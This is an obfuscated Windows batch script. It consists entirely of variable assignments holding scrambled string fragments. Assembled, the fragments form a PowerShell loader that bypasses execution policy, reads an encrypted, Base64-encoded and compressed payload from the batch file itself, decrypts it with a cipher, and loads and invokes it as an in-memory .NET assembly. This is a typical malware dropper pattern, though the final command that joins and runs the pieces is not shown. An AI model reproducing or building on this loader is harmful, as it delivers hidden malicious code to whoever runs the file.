@echo off
set "PruVngfyYx=py"
set "aRLpfxKTLO=xe"
set "KwOgxaHtDR=:\"
set "mEcVMpVzmR=we"
set "kBcnkmIsbp=rS"
set "YcMPgqYBPc=Wi"
set "lOTUIHYkoe=he"
set "jthzmeHbcp=po"
set "JdlWHPDrvW=we"
set "QsdrCehFAa=0\"
set "zWHawavLGM=st"
set "chhSRsuuit=\v"
set "LnysfzAKLD=nd"
set "TIEehaMhzM=32"
set "vhlANCeUJz=\W"
set "uXGbjtDnyn=ow"
set "rekUkVjqoa=1."
set "skSfDSycxz= /"
set "MLdCDZsrSh=em"
set "iItIZwsWND=.e"
set "QiXJZqZjoU=co"
set "bMakLJePpN=rs"
set "kPTijYXKHg=he"
set "nioYNmqiEn=ll"
set "sVkcFCwkjN=y "
set "BUlsULrIVC=in"
set "UxHtFZxljw=Po"
set "wulzBxYwbY=Sy"
set "eGDUeQrDSw=do"
set "ZrHmXvVbCn= C"
set "oolTrFzCPb=ws"
set "tgtwMkdplC=ll"
set "yMVgzXFRfH=s\"
set "LzGDJbnXLy=cd"
set "gqpoGlBcQS= %~dp0"
set "KyVIIYadvP=rans"
set "nVpLpsWkzP=$iFd"
set "jripWEAUzP=.Key"
set "TbfBeSGTUM=ress"
set "NNduwKTrqj=embl"
set "HAMdWWFKWr=::('"
set "tQtwPDzImV=);$R"
set "HdqMNfgpFd=-ep "
set "JmeyvETZjJ=mory"
set "UCqUFMeVlD=o = "
set "tnTbENzDjj=).Sp"
set "CaFoYZxBmS=ress"
set "qQqlXBUrzR=]::N"
set "MPWqpakkNC=O) {"
set "VxWeGgYDAP=] -j"
set "fanSgJOYVN=[Sys"
set "dPzlMTaOrL=fore"
set "cBoUfEpjce=ddin"
set "HpJJOwgAgG=ect "
set "qJOCUPLhvQ=gMod"
set "GzSAOFUIzk=pher"
set "mFaUQhNgWc=maKW"
set "GnLQcfDYhf=nirt"
set "JOIGYQdrko=yste"
set "IahRkXmSHQ=rtS4"
set "doHPUmnZXx=Comp"
set "ukoeGLoZjU=;$Os"
set "MzCUsWgWVi=)) {"
set "KNnBRVezkV=y.Ci"
set "JqZommwktM=iron"
set "JgSaQFrNhL=wPf."
set "EoMPIHIToH=tem."
set "rnmfYvtPPQ='0Pg"
set "CYygNuEvfM=Secu"
set "luzNAIfcGH=Itxd"
set "VRmSbSviGf=Obje"
set "jsGSsjEPLO=.Mod"
set "YlmWretNpw=am;$"
set "VZOotrerId=)))"
set "EkNziGaxVY=ddin"
set "wBRROvRnAT=srjG"
set "WyrTDtvNDS=Ljcg"
set "SvJftWeCwY=ne);"
set "cbXkfFAsum=BC;$"
set "SiONGgOZWU=stem"
set "hsaJExaZJR= = $"
set "BhTRTFZyXJ=join"
set "uZUqpOtthn=flec"
set "OLoVWwvWnV=$Xma"
set "VoaTCIjaPb= = ["
set "MCKWGmFiCw=.GZi"
set "httZhMbmFE=G.Pa"
set "EGCndVNbBO=and "
set "NlwMPBcgvA=vert"
set "NUxGUkbJUZ=]::C"
set "idPgTbLCKw=6] -"
set "vbjTGyaigr=New-"
set "qtpoICZOzF=s75K"
set "FlbWkFXSuf=);$i"
set "zxGPndqxSM=m.IO"
set "HEnAauTqJs=ke($"
set "LxKiuezCiK=sion"
set "KxDUhcBEMr=ck($"
set "VQMRJqTbcX=qO ="
set "PZtaENSJLE=Disp"
set "uIqiEVThxA=('%~f0'"
set "qLmIjMIbZJ= if "
set "WAFfSIONmi=F'[-"
set "PEcCVjecDd=Gkw."
set "hoiuAvNAbi=$jzg"
set "CTfhEQuzoL='txe"
set "izVHGOThzv=..-1"
